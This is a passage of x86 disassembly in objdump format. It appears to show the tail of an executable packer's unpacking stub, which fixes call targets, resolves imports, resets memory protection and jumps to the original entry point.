  414c0d:	8d 14 2f             	lea    (%edi,%ebp,1),%edx
  414c10:	83 fd fc             	cmp    $0xfffffffc,%ebp
  414c13:	76 0f                	jbe    0x414c24
  414c15:	8a 02                	mov    (%edx),%al
  414c17:	42                   	inc    %edx
  414c18:	88 07                	mov    %al,(%edi)
  414c1a:	47                   	inc    %edi
  414c1b:	49                   	dec    %ecx
  414c1c:	75 f7                	jne    0x414c15
  414c1e:	e9 63 ff ff ff       	jmp    0x414b86
  414c23:	90                   	nop
  414c24:	8b 02                	mov    (%edx),%eax
  414c26:	83 c2 04             	add    $0x4,%edx
  414c29:	89 07                	mov    %eax,(%edi)
  414c2b:	83 c7 04             	add    $0x4,%edi
  414c2e:	83 e9 04             	sub    $0x4,%ecx
  414c31:	77 f1                	ja     0x414c24
  414c33:	01 cf                	add    %ecx,%edi
  414c35:	e9 4c ff ff ff       	jmp    0x414b86
  414c3a:	5e                   	pop    %esi
  414c3b:	89 f7                	mov    %esi,%edi
  414c3d:	b9 04 00 00 00       	mov    $0x4,%ecx
  414c42:	8a 07                	mov    (%edi),%al
  414c44:	47                   	inc    %edi
  414c45:	2c e8                	sub    $0xe8,%al
  414c47:	3c 01                	cmp    $0x1,%al
  414c49:	77 f7                	ja     0x414c42
  414c4b:	80 3f 05             	cmpb   $0x5,(%edi)
  414c4e:	75 f2                	jne    0x414c42
  414c50:	8b 07                	mov    (%edi),%eax
  414c52:	8a 5f 04             	mov    0x4(%edi),%bl
  414c55:	66 c1 e8 08          	shr    $0x8,%ax
  414c59:	c1 c0 10             	rol    $0x10,%eax
  414c5c:	86 c4                	xchg   %al,%ah
  414c5e:	29 f8                	sub    %edi,%eax
  414c60:	80 eb e8             	sub    $0xe8,%bl
  414c63:	01 f0                	add    %esi,%eax
  414c65:	89 07                	mov    %eax,(%edi)
  414c67:	83 c7 05             	add    $0x5,%edi
  414c6a:	88 d8                	mov    %bl,%al
  414c6c:	e2 d9                	loop   0x414c47
  414c6e:	8d be 00 20 01 00    	lea    0x12000(%esi),%edi
  414c74:	8b 07                	mov    (%edi),%eax
  414c76:	09 c0                	or     %eax,%eax
  414c78:	74 45                	je     0x414cbf
  414c7a:	8b 5f 04             	mov    0x4(%edi),%ebx
  414c7d:	8d 84 30 e8 9b 01 00 	lea    0x19be8(%eax,%esi,1),%eax
  414c84:	01 f3                	add    %esi,%ebx
  414c86:	50                   	push   %eax
  414c87:	83 c7 08             	add    $0x8,%edi
  414c8a:	ff 96 24 9c 01 00    	call   *0x19c24(%esi)
  414c90:	95                   	xchg   %eax,%ebp
  414c91:	8a 07                	mov    (%edi),%al
  414c93:	47                   	inc    %edi
  414c94:	08 c0                	or     %al,%al
  414c96:	74 dc                	je     0x414c74
  414c98:	89 f9                	mov    %edi,%ecx
  414c9a:	79 07                	jns    0x414ca3
  414c9c:	0f b7 07             	movzwl (%edi),%eax
  414c9f:	47                   	inc    %edi
  414ca0:	50                   	push   %eax
  414ca1:	47                   	inc    %edi
  414ca2:	b9 57 48 f2 ae       	mov    $0xaef24857,%ecx
  414ca7:	55                   	push   %ebp
  414ca8:	ff 96 2c 9c 01 00    	call   *0x19c2c(%esi)
  414cae:	09 c0                	or     %eax,%eax
  414cb0:	74 07                	je     0x414cb9
  414cb2:	89 03                	mov    %eax,(%ebx)
  414cb4:	83 c3 04             	add    $0x4,%ebx
  414cb7:	eb d8                	jmp    0x414c91
  414cb9:	ff 96 28 9c 01 00    	call   *0x19c28(%esi)
  414cbf:	8b ae 30 9c 01 00    	mov    0x19c30(%esi),%ebp
  414cc5:	8d be 00 f0 ff ff    	lea    -0x1000(%esi),%edi
  414ccb:	bb 00 10 00 00       	mov    $0x1000,%ebx
  414cd0:	50                   	push   %eax
  414cd1:	54                   	push   %esp
  414cd2:	6a 04                	push   $0x4
  414cd4:	53                   	push   %ebx
  414cd5:	57                   	push   %edi
  414cd6:	ff d5                	call   *%ebp
  414cd8:	8d 87 d7 01 00 00    	lea    0x1d7(%edi),%eax
  414cde:	80 20 7f             	andb   $0x7f,(%eax)
  414ce1:	80 60 28 7f          	andb   $0x7f,0x28(%eax)
  414ce5:	58                   	pop    %eax
  414ce6:	50                   	push   %eax
  414ce7:	54                   	push   %esp
  414ce8:	50                   	push   %eax
  414ce9:	53                   	push   %ebx
  414cea:	57                   	push   %edi
  414ceb:	ff d5                	call   *%ebp
  414ced:	58                   	pop    %eax
  414cee:	61                   	popa
  414cef:	8d 44 24 80          	lea    -0x80(%esp),%eax
  414cf3:	6a 00                	push   $0x0
  414cf5:	39 c4                	cmp    %eax,%esp
  414cf7:	75 fa                	jne    0x414cf3
  414cf9:	83 ec 80             	sub    $0xffffff80,%esp
  414cfc:	e9 4f c4 fe ff       	jmp    0x401150
	...
